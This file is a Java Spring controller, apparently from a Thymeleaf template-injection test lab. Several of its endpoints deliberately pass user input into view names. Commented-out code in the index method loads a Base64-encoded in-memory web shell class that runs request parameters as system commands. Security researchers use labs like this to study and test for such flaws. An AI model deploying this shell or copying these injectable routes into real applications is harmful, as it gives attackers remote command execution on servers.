package com.example.testthymeleaf.Control;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.Base64Utils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestParam;

import java.lang.reflect.Method;

import static org.unbescape.uri.UriEscape.unescapeUriPath;

@Controller
public class Demo {
    Logger log =  LoggerFactory.getLogger(com.example.testthymeleaf.TestThymeleafApplication.class);

    @GetMapping("/")
    public String index(Model model) {
        model.addAttribute("message", "hello world!");
        try{

//            Class a = Class.forName("SpringRequestMappingMemshell");
//            Object object = a.getDeclaredConstructor().newInstance();
//            Method m = a.getDeclaredMethod("doInject");
//            m.invoke(object);
//            String className = "SpringRequestMappingMemshell";
//            String b64 = "yv66vgAAADQAqAoADQBTCABUCgBVAFYIAFcLAFgAWQcAWggAWwsABgBcBwBdCgANAF4IADsHAF8HAGAHAGEHAGIKAAwAYwoADgBkBwBlCAA9BwBmBwBnCgAVAFMIAGgKABUAaQcAagoAFABrCgAZAGwIAG0KAA8AbgoAEgBTCgAOAG8IAHAHAHEIAHIHAHMKAHQAdQoAdAB2CgB3AHgKACMAeQgAegoAIwB7CgAjAHwHAH0JAH4AfwoAKwCAAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABZhYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQBATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBITG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA%2FTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAGYHAHEBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAIEBABBNZXRob2RQYXJhbWV0ZXJzAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwALgAvAQAMaW5qZWN0LXN0YXJ0BwCCDACDAIQBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAIUMAIYAhwEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAiACJAQA%2Bb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcMAIoAiwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDACMAI0MAI4AjwEAHFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwBABBqYXZhL2xhbmcvU3RyaW5nAQA2b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuUGFyc2VyAQACLyoMAJAAkQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24MAJIAkwwALgCUAQAADAAuAJUMAJYAlwEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEADGluamVjdC1lcnJvcgEAEWphdmEvdXRpbC9TY2FubmVyBwCYDACZAJoMAJsAnAcAnQwAngCfDAAuAKABAAJcQQwAoQCiDACjADYBACdvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHkHAKQMAKUApgwALgCnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAggoTGphdmEvbGFuZy9TdHJpbmc7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQASAA0AAAAAAAMAAQAuAC8AAQAwAAAALwABAAEAAAAFKrcAAbEAAAACADEAAAAGAAEAAAAQADIAAAAMAAEAAAAFADMANAAAAAkANQA2AAEAMAAAAYIACgAIAAAAshICS7gAAxIEA7kABQMAwAAGTCsSB7kACAIAwAAJTSy2AAoSCwa9AAxZAxINU1kEEg5TWQUSD1O2ABBOLQS2ABESEhITBL0ADFkDEhRTtgAQOgS7ABVZtwAWEhe2ABg6BbsAGVkEvQAUWQMZBbgAGlO3ABs6BrsAD1kSHBkGAQEBAQEBtwAdOgctLAa9AA1ZA7sAElm3AB5TWQQZBFNZBRkHU7YAH1cSIEunAAdMEiJLKrAAAQADAKkArAAhAAMAMQAAAD4ADwAAABIAAwAUABIAFQAeABYAOwAXAEAAGABSABkAYAAaAHUAGwCIABwApgAdAKkAIACsAB4ArQAfALAAIQAyAAAAXAAJABIAlwA3ADgAAQAeAIsAOQA6AAIAOwBuADsAPAADAFIAVwA9ADwABABgAEkAPgA%2FAAUAdQA0AEAAQQAGAIgAIQBCAEMABwCtAAMARABFAAEAAwCvAEYARwAAAEgAAAAQAAL%2FAKwAAQcASQABBwBKAwABAD0ASwADADAAAABoAAQAAwAAACa7ACNZuAAkK7YAJbYAJrcAJxIotgAptgAqTbsAK1kssgAstwAtsAAAAAIAMQAAAAoAAgAAACUAGgAmADIAAAAgAAMAAAAmADMANAAAAAAAJgBMAEcAAQAaAAwATQBHAAIATgAAAAQAAQBPAFAAAAAFAQBMAAAAAQBRAAAAAgBS";
//            byte[] bytes = Base64Utils.decodeFromString(unescapeUriPath(b64));
//            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//
//            try {
//                Class a = classLoader.loadClass(className);
//                Object object = a.getDeclaredConstructor().newInstance();
//                Method m = a.getDeclaredMethod("doInject");
//                m.invoke(object);
//            }catch (ClassNotFoundException e){
//                java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
//                m0.setAccessible(true);
//                m0.invoke(classLoader, className, bytes, 0, bytes.length);
//                Class b = classLoader.loadClass(className);
//                Object objectb = b.getDeclaredConstructor().newInstance();
//                Method m1 = b.getDeclaredMethod("doInject");
//                m1.invoke(objectb);
//            }
        }catch (Exception e){
            System.out.println(e);
        }
        return "index";
    }


    @GetMapping("/admin")
    public String path(@RequestParam String language) {
        return "language/" + language + "/admin";
    }

    @GetMapping("/test/en")
    public String testPage(Model model) {
        model.addAttribute("message", "hello en!");
        return "language/en/admin";
    }
    @GetMapping("/test/cn")
    public String testPages(Model model) {
        model.addAttribute("message", "hello cn!");
        return "language/cn/admin";
    }

    @GetMapping("/page")
    public String path(@RequestParam String exp, Model model) {
        model.addAttribute("exp", exp);
        return "exp";
    }

    @GetMapping("/getContent")
    public String getPage(String page) {
        return "/test::" + page;
    }

    @GetMapping("/admin/{page}")
    public String getAdminPage(@PathVariable String page) {
        log.info("Pages: " + page);
        return "language/cn/" + page;
    }

    @GetMapping("/con/{page}")
    public void getAdminPages(@PathVariable String page) {
        log.info("Pages: " + page);
    }

    @GetMapping("/home/{page}")
    public String getHome(@PathVariable String page) {
        log.info("Pages: " + page);
        return "home/" + page;
    }


}
